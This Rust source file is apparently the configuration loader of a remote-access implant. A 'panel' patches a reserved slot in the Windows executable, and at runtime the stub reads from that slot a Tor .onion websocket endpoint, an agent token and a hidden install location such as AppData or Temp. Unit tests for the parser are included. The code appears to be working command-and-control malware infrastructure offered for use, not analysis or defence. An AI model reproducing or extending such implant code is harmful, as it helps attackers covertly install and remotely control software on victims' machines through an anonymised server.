use std::{fs, path::PathBuf};

use crate::transport::Endpoint;

// The legacy payload magic is retained so older test fixtures can still be
// parsed safely. Production stubs use CONFIG_SLOT_MARKER below, which is
// unique to the reserved configuration region.
const MAGIC: &[u8; 8] = b"VLHCFG\x00\x01";

// A 4 KiB patchable region is emitted into the PE image in a dedicated
// read-only section. The panel locates this exact marker instead of blindly
// patching the first occurrence of MAGIC in the executable.
const CONFIG_SLOT_MARKER: &[u8; 32] =
    b"VALHALLA-EINHERJAR-CFG-SLOT-V1\x00\x00";
const CONFIG_SLOT_SIZE: usize = 4096;
const CONFIG_SLOT_HEADER_SIZE: usize = CONFIG_SLOT_MARKER.len() + 4;
const BLOCK_SEARCH_MAX: usize = 64 * 1024 * 1024;

const DEFAULT_ONION: &str = "";
const DEFAULT_FOLDER: &str = "Einherjar";

const fn config_slot_template() -> [u8; CONFIG_SLOT_SIZE] {
    let mut slot = [0u8; CONFIG_SLOT_SIZE];
    let mut i = 0;
    while i < CONFIG_SLOT_MARKER.len() {
        slot[i] = CONFIG_SLOT_MARKER[i];
        i += 1;
    }

    let capacity = (CONFIG_SLOT_SIZE - CONFIG_SLOT_HEADER_SIZE) as u32;
    slot[CONFIG_SLOT_MARKER.len()] = capacity as u8;
    slot[CONFIG_SLOT_MARKER.len() + 1] = (capacity >> 8) as u8;
    slot[CONFIG_SLOT_MARKER.len() + 2] = (capacity >> 16) as u8;
    slot[CONFIG_SLOT_MARKER.len() + 3] = (capacity >> 24) as u8;
    slot
}

// SAFETY: this static is immutable and contains only configuration bytes. The
// section is read-only data on Windows and is intentionally reserved for the
// panel's byte-for-byte patching step.
#[used]
#[cfg_attr(target_os = "windows", unsafe(link_section = ".rdata$VLHCFG"))]
#[unsafe(no_mangle)]
pub static EMBEDDED_CONFIG_SLOT: [u8; CONFIG_SLOT_SIZE] = config_slot_template();

#[inline(never)]
fn anchor_config_slot() {
    // A volatile read creates a real code/data reference to the slot. This is
    // deliberately tiny and only exists to make the patchable region survive
    // aggressive release linking and LTO.
    let first = unsafe { std::ptr::read_volatile(EMBEDDED_CONFIG_SLOT.as_ptr()) };
    std::hint::black_box(first);
}

#[derive(Clone, Debug)]
pub enum InstallDir {
    Roaming,
    Local,
    Temp,
    ProgramFiles,
    ProgramData,
}

impl InstallDir {
    pub fn from_byte(b: u8) -> Option<Self> {
        match b {
            0 => Some(Self::Roaming),
            1 => Some(Self::Local),
            2 => Some(Self::Temp),
            3 => Some(Self::ProgramFiles),
            4 => Some(Self::ProgramData),
            _ => None,
        }
    }

    pub fn resolve(&self) -> Option<PathBuf> {
        let var = match self {
            Self::Roaming => "APPDATA",
            Self::Local => "LOCALAPPDATA",
            Self::Temp => "TEMP",
            Self::ProgramFiles => "PROGRAMFILES",
            Self::ProgramData => "PROGRAMDATA",
        };
        std::env::var_os(var).map(PathBuf::from)
    }
}

pub struct Config {
    pub install_dir: InstallDir,
    pub folder_name: String,
    pub onion: String,
    pub agent_token: String,
}

/// Read configuration from the running executable image.
/// Returns (Endpoint, display_string, InstallDir, folder_name, agent_token).
pub(crate) fn load_config() -> Result<(Endpoint, String, InstallDir, String, String), String> {
    anchor_config_slot();
    let exe = std::env::current_exe()
        .map_err(|error| format!("unable to locate executable: {error}"))?;
    let bytes = fs::read(&exe)
        .map_err(|error| format!("unable to read executable image: {error}"))?;

    let cfg = parse_config(&bytes).unwrap_or_else(|| Config {
        install_dir: InstallDir::Local,
        folder_name: DEFAULT_FOLDER.to_owned(),
        onion: DEFAULT_ONION.to_owned(),
        agent_token: String::new(),
    });

    if cfg.onion.is_empty() {
        return Err("embedded configuration has no endpoint".to_owned());
    }

    let endpoint = Endpoint::parse(&cfg.onion)
        .map_err(|_| "embedded configuration contains an invalid endpoint".to_owned())?;
    let display = cfg.onion.clone();
    if cfg.agent_token.is_empty() {
        return Err("embedded configuration has no agent token".to_owned());
    }
    Ok((
        endpoint,
        display,
        cfg.install_dir,
        cfg.folder_name,
        cfg.agent_token,
    ))
}

/// Read only the connection endpoint from the embedded stub configuration.
pub(crate) fn load_endpoint() -> Result<(Endpoint, String), String> {
    let (endpoint, display, _install_dir, _folder_name, _agent_token) = load_config()?;
    Ok((endpoint, display))
}

fn parse_config(bytes: &[u8]) -> Option<Config> {
    let scan_limit = bytes.len().min(BLOCK_SEARCH_MAX);
    let haystack = &bytes[..scan_limit];

    // Prefer the dedicated configuration slot. A stale or unconfigured slot
    // is ignored rather than treated as a fatal parse error.
    let mut search_from = 0;
    while search_from + CONFIG_SLOT_MARKER.len() <= haystack.len() {
        let Some(rel) = haystack[search_from..]
            .windows(CONFIG_SLOT_MARKER.len())
            .position(|w| w == CONFIG_SLOT_MARKER) else {
            break;
        };
        let marker_pos = search_from + rel;
        let capacity_pos = marker_pos + CONFIG_SLOT_MARKER.len();
        let Some(capacity) = read_u32_le(bytes, capacity_pos).map(|value| value as usize) else {
            search_from = marker_pos + 1;
            continue;
        };
        let payload_pos = capacity_pos + 4;
        if capacity > 0
            && capacity <= CONFIG_SLOT_SIZE - CONFIG_SLOT_HEADER_SIZE
            && payload_pos + capacity <= bytes.len()
        {
            if let Some(cfg) = parse_payload(bytes, payload_pos, payload_pos + capacity) {
                return Some(cfg);
            }
        }
        search_from = marker_pos + 1;
    }

    // Backwards-compatible parser for compact test fixtures and older stubs.
    // Crucially, every candidate is validated and malformed magic is skipped,
    // so an unrelated MAGIC occurrence cannot hide a later valid block.
    let mut search_from = 0;
    while search_from + MAGIC.len() <= haystack.len() {
        let Some(rel) = haystack[search_from..]
            .windows(MAGIC.len())
            .position(|w| w == MAGIC) else {
            break;
        };
        let magic_pos = search_from + rel;
        if let Some(cfg) = parse_payload(bytes, magic_pos + MAGIC.len(), scan_limit) {
            return Some(cfg);
        }
        search_from = magic_pos + 1;
    }

    None
}

fn parse_payload(bytes: &[u8], start: usize, limit: usize) -> Option<Config> {
    if start > limit || limit > bytes.len() {
        return None;
    }
    let mut cursor = start;

    let install_byte = *bytes.get(cursor)?;
    cursor += 1;
    let install_dir = InstallDir::from_byte(install_byte)?;

    let folder_len = read_u16_le(bytes, cursor)? as usize;
    cursor += 2;
    if folder_len > 260 || cursor.checked_add(folder_len)? > limit {
        return None;
    }
    let folder_bytes = bytes.get(cursor..cursor + folder_len)?;
    let folder_name = std::str::from_utf8(folder_bytes).ok()?.trim().to_owned();
    if folder_name.is_empty() {
        return None;
    }
    cursor += folder_len;

    let onion_len = read_u16_le(bytes, cursor)? as usize;
    cursor += 2;
    if onion_len > 512 || cursor.checked_add(onion_len)? > limit {
        return None;
    }
    let onion_bytes = bytes.get(cursor..cursor + onion_len)?;
    let onion = std::str::from_utf8(onion_bytes).ok()?.trim().to_owned();
    if onion.is_empty() {
        return None;
    }
    cursor += onion_len;

    let agent_token_len = read_u16_le(bytes, cursor)? as usize;
    cursor += 2;
    if agent_token_len == 0
        || agent_token_len > 256
        || cursor.checked_add(agent_token_len)? > limit
    {
        return None;
    }
    let token_bytes = bytes.get(cursor..cursor + agent_token_len)?;
    let agent_token = std::str::from_utf8(token_bytes).ok()?.trim().to_owned();
    if agent_token.is_empty() {
        return None;
    }

    Some(Config {
        install_dir,
        folder_name,
        onion,
        agent_token,
    })
}

fn read_u16_le(bytes: &[u8], pos: usize) -> Option<u16> {
    let lo = *bytes.get(pos)? as u16;
    let hi = *bytes.get(pos + 1)? as u16;
    Some(lo | (hi << 8))
}

fn read_u32_le(bytes: &[u8], pos: usize) -> Option<u32> {
    let b0 = *bytes.get(pos)? as u32;
    let b1 = *bytes.get(pos + 1)? as u32;
    let b2 = *bytes.get(pos + 2)? as u32;
    let b3 = *bytes.get(pos + 3)? as u32;
    Some(b0 | (b1 << 8) | (b2 << 16) | (b3 << 24))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_block(dir: u8, folder: &str, onion: &str, token: &str) -> Vec<u8> {
        let mut v = MAGIC.to_vec();
        v.push(dir);
        let fb = folder.as_bytes();
        v.extend_from_slice(&(fb.len() as u16).to_le_bytes());
        v.extend_from_slice(fb);
        let ob = onion.as_bytes();
        v.extend_from_slice(&(ob.len() as u16).to_le_bytes());
        v.extend_from_slice(ob);
        let tb = token.as_bytes();
        v.extend_from_slice(&(tb.len() as u16).to_le_bytes());
        v.extend_from_slice(tb);
        v
    }

    #[test]
    fn parse_valid_block() {
        let block = make_block(
            1,
            "Einherjar",
            "ws://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion:443/",
            "token",
        );
        let cfg = parse_config(&block).expect("should parse");
        assert!(matches!(cfg.install_dir, InstallDir::Local));
        assert_eq!(cfg.folder_name, "Einherjar");
        assert!(cfg.onion.contains(".onion"));
        assert_eq!(cfg.agent_token, "token");
    }

    #[test]
    fn parse_block_embedded_in_larger_payload() {
        let mut data = vec![0u8; 1024];
        let block = make_block(
            2,
            "Vikings",
            "ws://bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.onion:443/valhalla",
            "token",
        );
        data[512..512 + block.len()].copy_from_slice(&block);
        let cfg = parse_config(&data).expect("should find block");
        assert!(matches!(cfg.install_dir, InstallDir::Temp));
        assert_eq!(cfg.folder_name, "Vikings");
    }

    #[test]
    fn skips_unrelated_magic_before_the_real_configuration_slot() {
        let invalid = make_block(99, "ignored", "ws://ignored", "ignored");
        let valid = make_block(
            1,
            "Einherjar",
            "ws://cccccccccccccccccccccccccccccccccccccccccccccccccccccccc.onion:443/",
            "token",
        );
        let mut data = invalid;
        data.extend_from_slice(&[0x42; 13]);
        data.extend_from_slice(&valid);
        let cfg = parse_config(&data).expect("should skip unrelated magic");
        assert_eq!(cfg.folder_name, "Einherjar");
        assert_eq!(cfg.agent_token, "token");
    }

    #[test]
    fn skips_invalid_slot_marker_before_valid_slot() {
        let capacity = CONFIG_SLOT_SIZE - CONFIG_SLOT_HEADER_SIZE;
        let mut data = vec![0u8; CONFIG_SLOT_SIZE * 2];

        data[..CONFIG_SLOT_MARKER.len()].copy_from_slice(CONFIG_SLOT_MARKER);
        data[CONFIG_SLOT_MARKER.len()..CONFIG_SLOT_HEADER_SIZE]
            .copy_from_slice(&u32::MAX.to_le_bytes());

        let second = CONFIG_SLOT_SIZE;
        data[second..second + CONFIG_SLOT_MARKER.len()].copy_from_slice(CONFIG_SLOT_MARKER);
        data[second + CONFIG_SLOT_MARKER.len()..second + CONFIG_SLOT_HEADER_SIZE]
            .copy_from_slice(&(capacity as u32).to_le_bytes());
        let block = make_block(1, "Einherjar", &format!("ws://{}.onion:443/", "e".repeat(56)), "token");
        let payload = &block[MAGIC.len()..];
        data[second + CONFIG_SLOT_HEADER_SIZE..second + CONFIG_SLOT_HEADER_SIZE + payload.len()]
            .copy_from_slice(payload);

        let cfg = parse_config(&data).expect("should skip invalid slot marker");
        assert_eq!(cfg.folder_name, "Einherjar");
        assert_eq!(cfg.agent_token, "token");
    }

    #[test]
    fn parse_dedicated_config_slot() {
        let block = make_block(
            1,
            "Einherjar",
            "ws://dddddddddddddddddddddddddddddddddddddddddddddddddddddddd.onion:443/",
            "token",
        );
        let payload = &block[MAGIC.len()..];
        let capacity = CONFIG_SLOT_SIZE - CONFIG_SLOT_HEADER_SIZE;
        assert!(payload.len() <= capacity);

        let mut data = vec![0u8; CONFIG_SLOT_HEADER_SIZE + capacity];
        data[..CONFIG_SLOT_MARKER.len()].copy_from_slice(CONFIG_SLOT_MARKER);
        data[CONFIG_SLOT_MARKER.len()..CONFIG_SLOT_HEADER_SIZE]
            .copy_from_slice(&(capacity as u32).to_le_bytes());
        data[CONFIG_SLOT_HEADER_SIZE..CONFIG_SLOT_HEADER_SIZE + payload.len()]
            .copy_from_slice(payload);

        let cfg = parse_config(&data).expect("should parse dedicated slot");
        assert_eq!(cfg.folder_name, "Einherjar");
        assert_eq!(cfg.agent_token, "token");
    }

    #[test]
    fn unconfigured_slot_is_rejected() {
        let mut data = vec![0u8; CONFIG_SLOT_SIZE];
        data[..CONFIG_SLOT_MARKER.len()].copy_from_slice(CONFIG_SLOT_MARKER);
        let capacity = CONFIG_SLOT_SIZE - CONFIG_SLOT_HEADER_SIZE;
        data[CONFIG_SLOT_MARKER.len()..CONFIG_SLOT_HEADER_SIZE]
            .copy_from_slice(&(capacity as u32).to_le_bytes());
        assert!(parse_config(&data).is_none());
    }

    #[test]
    fn empty_bytes_returns_none() {
        assert!(parse_config(&[]).is_none());
    }
}
